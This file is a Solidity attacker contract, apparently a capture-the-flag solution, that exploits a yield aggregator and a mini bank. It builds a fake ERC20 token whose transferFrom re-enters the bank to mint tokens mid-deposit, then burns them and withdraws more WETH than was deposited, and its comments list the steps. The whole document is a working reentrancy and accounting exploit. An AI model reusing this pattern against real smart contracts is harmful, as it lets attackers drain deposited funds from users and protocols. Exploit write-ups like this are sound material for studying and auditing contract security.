pragma solidity 0.8.0;

import "./Setup.sol";
import "hardhat/console.sol";

contract YieldAggregatorAttackerIballes is WETH9{

    Setup private setup;
    YieldAggregator private aggregator;
    MiniBank private bank;
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    
    constructor(Setup _setup) payable {
        setup = _setup;
        aggregator = _setup.aggregator();
        bank = _setup.bank();

        weth.deposit{value: msg.value}();
    }

    function attack() external{
        // 1. create a fake ecr20like to enable reentrancy inside the transferFrom function
        // 2. correctly deposit some ammount with the first pos of the array being real weth
        // 3. go inside the transferFrom fake while triggering the catch
        // 4. mint a ton of tokens to the bank directly thorugh the mint function from the fake transfer
        // 5. after deposit ends, retrieve the minted through burn
        // 6. call withdraw to withdraw extra bceause of the poolTokens diff
        
        weth.approve(address(aggregator), 1 ether);
        address[] memory tokens = new address[](2);
        tokens[0] = address(weth);
        tokens[1] = address(this);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;
        aggregator.deposit(Protocol(address(bank)), tokens, amounts);
        bank.burn(50 ether);

        address[] memory tokens2 = new address[](1);
        tokens2[0] = address(weth);
        uint256[] memory amounts2 = new uint256[](1);
        amounts2[0] = 51 ether;
        aggregator.withdraw(Protocol(address(bank)), tokens2, amounts2);
    }

    // erc20 interface
    function deposit() external override payable {
        weth.deposit{value: msg.value}();
    }

    function transfer(address dst, uint256 qty) external override returns (bool){
        return weth.transfer(dst, qty);
    }

    function transferFrom(
        address src,
        address dst,
        uint256 qty
    ) external override returns (bool){
        weth.approve(address(bank), 50 ether);
        bank.mint(50 ether);
        return true;
    }

    function balanceOf(address who) external view override returns (uint256){
        return weth.balanceOf(who);
    }

    function approve(address guy, uint256 wad) external override returns (bool){
        return weth.approve(guy, wad);
    }

    receive() external payable{

    }

}